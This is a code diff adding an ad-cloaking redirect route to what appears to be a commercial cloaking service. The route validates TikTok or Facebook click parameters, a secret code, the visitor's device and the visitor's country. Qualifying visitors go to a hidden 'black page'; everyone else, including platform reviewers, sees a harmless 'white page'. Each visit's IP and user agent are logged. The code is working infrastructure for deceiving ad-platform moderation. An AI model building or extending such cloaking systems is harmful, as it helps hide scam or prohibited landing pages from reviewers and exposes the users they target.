@@ -1077,5 +1077,144 @@ export async function registerRoutes(
     }
   });
 
+  // Alternative cloaking route without /r/ prefix - for cleaner URLs
+  // This catches /:slug patterns on custom domains only
+  app.get("/:slug", async (req: Request, res: Response, next: NextFunction) => {
+    const { slug } = req.params;
+    
+    // Skip known routes and static files
+    const skipPaths = ["api", "assets", "src", "@", "node_modules", "favicon.ico", "robots.txt"];
+    if (skipPaths.some(p => slug.startsWith(p)) || slug.includes(".")) {
+      return next();
+    }
+    
+    const rawHost = req.get("host") || "";
+    const host = rawHost.split(":")[0];
+    const forwardedHost = (req.get("x-forwarded-host") || "").split(":")[0];
+    const domainToCheck = forwardedHost || host;
+    
+    // Only handle if it's a registered custom domain (not the main app domain)
+    const domain = await storage.getDomainBySubdomain(domainToCheck);
+    if (!domain || !domain.isActive || !domain.isVerified) {
+      return next(); // Let other routes handle it
+    }
+    
+    // Check if offer exists for this slug
+    const offer = await storage.getOfferBySlugAndDomain(slug, domain.id);
+    if (!offer) {
+      return next(); // Not a valid offer slug
+    }
+    
+    // Forward to the main cloaking handler by rewriting the URL
+    req.url = `/r/${slug}`;
+    req.params.slug = slug;
+    
+    // Manually trigger the /r/:slug handler logic
+    const startTime = Date.now();
+    const userAgent = req.get("user-agent") || "";
+    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.ip || "";
+    const referer = req.get("referer") || "";
+
+    try {
+      if (!offer.isActive) {
+        console.log(`[Cloak] Offer inactive: ${slug}`);
+        return res.status(404).send("Not found");
+      }
+
+      const owner = await storage.getUser(offer.userId);
+      if (!owner) {
+        return res.status(404).send("Not found");
+      }
+
+      const isSuspended = owner.suspendedAt !== null;
+      if (isSuspended) {
+        console.log(`[Cloak] User suspended: ${offer.userId}`);
+        return res.redirect(302, offer.whitePageUrl);
+      }
+
+      // Check click limits
+      const plan = owner.planId ? await storage.getPlan(owner.planId) : null;
+      if (plan && !plan.isUnlimited) {
+        const userOffers = await storage.getOffersByUserId(offer.userId);
+        const totalClicks = userOffers.reduce((sum, o) => sum + (o.totalClicks || 0), 0);
+        
+        if (totalClicks >= plan.maxClicks) {
+          const gracePeriodEnd = owner.subscriptionEndDate 
+            ? new Date(new Date(owner.subscriptionEndDate).getTime() + 3 * 24 * 60 * 60 * 1000)
+            : null;
+          
+          if (!gracePeriodEnd || new Date() > gracePeriodEnd) {
+            console.log(`[Cloak] User over click limit: ${offer.userId} (${totalClicks}/${plan.maxClicks})`);
+            return res.redirect(302, offer.whitePageUrl);
+          }
+        }
+      }
+
+      // Validate required parameters based on platform
+      const { ttclid, cname, fbcl, xcode } = req.query as Record<string, string>;
+      let paramsValid = false;
+      let failReason = "";
+
+      if (offer.platform === "tiktok") {
+        if (!ttclid || !cname || !xcode) {
+          failReason = "missing_tiktok_params";
+        } else if (xcode !== offer.xcode) {
+          failReason = "invalid_xcode";
+        } else {
+          paramsValid = true;
+        }
+      } else if (offer.platform === "facebook") {
+        if (!fbcl || !xcode) {
+          failReason = "missing_facebook_params";
+        } else if (xcode !== offer.xcode) {
+          failReason = "invalid_xcode";
+        } else {
+          const parts = fbcl.split("|");
+          if (parts.length < 2 || !parts[0] || !parts[1]) {
+            failReason = "invalid_fbcl_format";
+          } else {
+            paramsValid = true;
+          }
+        }
+      }
+
+      const deviceType = parseUserAgent(userAgent);
+      const deviceAllowed = offer.allowedDevices.includes(deviceType);
+      const country = await getCountryFromIP(ip);
+      const countryAllowed = offer.allowedCountries.includes(country);
+
+      const shouldRedirectToBlack = paramsValid && deviceAllowed && countryAllowed;
+      const redirectType = shouldRedirectToBlack ? "black" : "white";
+      const targetUrl = shouldRedirectToBlack ? offer.blackPageUrl : offer.whitePageUrl;
+
+      await storage.createClickLog({
+        offerId: offer.id,
+        domainId: domain.id,
+        platform: offer.platform,
+        redirectType,
+        ipAddress: ip,
+        userAgent,
+        country,
+        deviceType,
+        referer,
+        ttclid: ttclid || null,
+        fbcl: fbcl || null,
+        campaignName: offer.platform === "tiktok" ? cname : (fbcl?.split("|")[0] || null),
+        campaignId: offer.platform === "facebook" ? (fbcl?.split("|")[1] || null) : null,
+        failReason: shouldRedirectToBlack ? null : failReason || `device:${!deviceAllowed};country:${!countryAllowed}`,
+      });
+
+      await storage.incrementOfferClicks(offer.id, shouldRedirectToBlack);
+
+      const duration = Date.now() - startTime;
+      console.log(`[Cloak] ${redirectType.toUpperCase()} redirect for ${slug} (${duration}ms) - device:${deviceType}, country:${country}, params:${paramsValid ? "ok" : failReason}`);
+
+      return res.redirect(302, targetUrl);
+    } catch (error) {
+      console.error("[Cloak] Error:", error);
+      return res.status(500).send("Internal server error");
+    }
+  });
+
   return httpServer;
 }
